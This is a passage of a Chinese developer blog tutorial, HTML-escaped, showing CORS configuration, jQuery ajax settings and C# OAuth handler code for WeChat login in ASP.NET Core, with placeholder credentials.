                    builder.WithOrigins(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://s86zxm.natappfree.cc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://127.0.0.1:65502&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).AllowAnyHeader().AllowAnyMethod().AllowCredentials();
                });
            });

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Configure中（一定是在 app.UserMvc())之前配置）&lt;/span&gt;
app.UseCors(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AllowCORS&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;a)这里的临时域名就是我们上篇说的基于natapp生成的动态的。&lt;/p&gt;
&lt;p&gt;b)这里的 UseCors一定是要在app.UseMvc()之前；另外我这里是全局配置，如果您需要针对 controller或者action单独配置，可以去掉这里的app.usecors,在每个controller上或者action上加上EnableCors(&quot;跨域策略名称&quot;)，我们这里的策略名称是AllowCORS。&lt;/p&gt;
&lt;p&gt;ajax中的请求方式，要注意以下几个点：&lt;/p&gt;
&lt;p&gt;async: true,&lt;span&gt;//Failed to execute 'send' on 'XMLHttpRequest'&lt;/span&gt;&lt;br/&gt;dataType: 'jsonp',&lt;br/&gt;crossDomain: true,&lt;/p&gt;
&lt;p&gt;&lt;span&gt;需要指定ajax的这三个属性，其中第一个 如果使用 false，也就似乎非异步方式，会出现后面红色的错误提示。大致的参考脚本如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$.ajax({
                    type: &lt;/span&gt;'get'&lt;span&gt;,
                    async: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;,&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Failed to execute 'send' on 'XMLHttpRequest'&lt;/span&gt;
                    dataType: 'jsonp'&lt;span&gt;,
                    crossDomain: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;,
                    url: &lt;/span&gt;'/api/identity/OAuth2?provider=Weixin&amp;amp;returnUrl=/'&lt;span&gt;,
                    success: &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; (res) {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do something &lt;/span&gt;
                    }, error: &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (xhr, err) {
                        console.log(xhr.statusCode);
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do something &lt;/span&gt;
&lt;span&gt;                    }
                });&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;1.2.解决配置问题&lt;/h4&gt;
&lt;p&gt;a) 这里的配置指的是，比如微信开发域名的问题,这个问题在上一篇中，有说到，如果不知道的可以点这里 &lt;a href=&quot;https://www.cnblogs.com/Tmc-Blog/p/9966796.html&quot; target=&quot;_blank&quot;&gt;域名配置&lt;/a&gt;  &lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;b) 另一个就是 配置微信或者QQ的 appId和AppSecret,这个获取方式上一篇有说（微信），QQ类似；在我们的 core项目中配置，参考如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;configureService中配置&lt;/span&gt;
services.AddAuthentication().AddWeixinAuthentication(options =&amp;gt;&lt;span&gt;
            {
                options.ClientId &lt;/span&gt;= Configuration[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication:WeChat:AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];
                options.ClientSecret &lt;/span&gt;= Configuration[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication:WeChat:AppKey&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];
            });
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;configures中使用&lt;/span&gt;
&lt;span&gt;app.UseAuthentication();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;配置文件中：&lt;/span&gt;
&lt;span&gt;{
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ESoftor&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:{
       &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Authentication&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
              &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WeChat&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
                   &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;你的微信AppId&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                   &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AppKey&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;你的微信secret&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                }
        }  
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以上这些完成之后，我们就一切就绪了，重点来了，代码：&lt;/p&gt;

&lt;h3&gt;2.授权实现&lt;/h3&gt;
&lt;p&gt;以下五个相关文件直接复制到项目（不需要做任何改动），便可直接使用，本人已全部测试通过，，谢谢配合。&lt;/p&gt;
&lt;p&gt;WeixinAuthenticationDefaults.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default values for Weixin authentication.
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeixinAuthenticationDefaults
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;AuthenticationOptions.DefaultAuthenticateScheme&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; AuthenticationScheme = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; DisplayName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;RemoteAuthenticationOptions.CallbackPath&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; CallbackPath = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/signin-weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;AuthenticationSchemeOptions.ClaimsIssuer&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Issuer = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.AuthorizationEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; AuthorizationEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://open.weixin.qq.com/connect/qrconnect&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.TokenEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; TokenEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.weixin.qq.com/sns/oauth2/access_token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.UserInformationEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserInformationEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.weixin.qq.com/sns/userinfo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeiXinAuthenticationExtensions.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;&lt;img id=&quot;code_img_closed_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;75&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeiXinAuthenticationExtensions
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; AuthenticationBuilder builder)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; builder.AddWeixinAuthentication(WeixinAuthenticationDefaults.AuthenticationScheme, WeixinAuthenticationDefaults.DisplayName, options =&amp;gt;&lt;span&gt; { });
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; builder.AddWeixinAuthentication(WeixinAuthenticationDefaults.AuthenticationScheme, WeixinAuthenticationDefaults.DisplayName, configureOptions);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, &lt;span&gt;string&lt;/span&gt; authenticationScheme, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; builder.AddWeixinAuthentication(authenticationScheme, WeixinAuthenticationDefaults.DisplayName, configureOptions);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, &lt;span&gt;string&lt;/span&gt; authenticationScheme, &lt;span&gt;string&lt;/span&gt; displayName, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; builder.AddOAuth&amp;lt;WeixinAuthenticationOptions, WeixinAuthenticationHandler&amp;gt;&lt;span&gt;(authenticationScheme, displayName, configureOptions);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationHandler.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;&lt;img id=&quot;code_img_closed_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;127&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; WeixinAuthenticationHandler : OAuthHandler&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; WeixinAuthenticationHandler(IOptionsMonitor&amp;lt;WeixinAuthenticationOptions&amp;gt; options, ILoggerFactory logger, UrlEncoder encoder, ISystemClock clock) : &lt;span&gt;base&lt;/span&gt;&lt;span&gt;(options, logger, encoder, clock)
        {
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;  Last step:
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;  create ticket from remote server
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;identity&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;properties&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;tokens&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;AuthenticationTicket&amp;gt;&lt;span&gt; CreateTicketAsync(ClaimsIdentity identity, AuthenticationProperties properties, OAuthTokenResponse tokens)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; address = QueryHelpers.AddQueryString(Options.UserInformationEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;access_token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; tokens.AccessToken,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = tokens.Response.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; response = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; Backchannel.GetAsync(address);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;response.IsSuccessStatusCode)
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving the user profile: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpRequestException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving user information.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; payload = JObject.Parse(&lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;string&lt;/span&gt;.IsNullOrEmpty(payload.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;errcode&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)))
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving the user profile: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpRequestException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving user information.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.NameIdentifier, WeixinAuthenticationHelper.GetUnionid(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Name, WeixinAuthenticationHelper.GetNickname(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Gender, WeixinAuthenticationHelper.GetSex(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Country, WeixinAuthenticationHelper.GetCountry(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetOpenId(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:province&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetProvince(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:city&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetCity(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:headimgurl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetHeadimgUrl(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:privilege&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetPrivilege(payload), Options.ClaimsIssuer));

            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:user_info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, payload.ToString(), Options.ClaimsIssuer));

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; context = &lt;span&gt;new&lt;/span&gt; OAuthCreatingTicketContext(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ClaimsPrincipal(identity), properties, Context, Scheme, Options, Backchannel, tokens, payload);
            context.RunClaimActions();

            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; Events.CreatingTicket(context);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; AuthenticationTicket(context.Principal, context.Properties, Scheme.Name);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Step 2：通过code获取access_token
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;OAuthTokenResponse&amp;gt; ExchangeCodeAsync(&lt;span&gt;string&lt;/span&gt; code, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; redirectUri)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; address = QueryHelpers.AddQueryString(Options.TokenEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;()
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;appid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientId,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;secret&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientSecret,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; code,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;grant_type&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;authorization_code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; response = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; Backchannel.GetAsync(address);
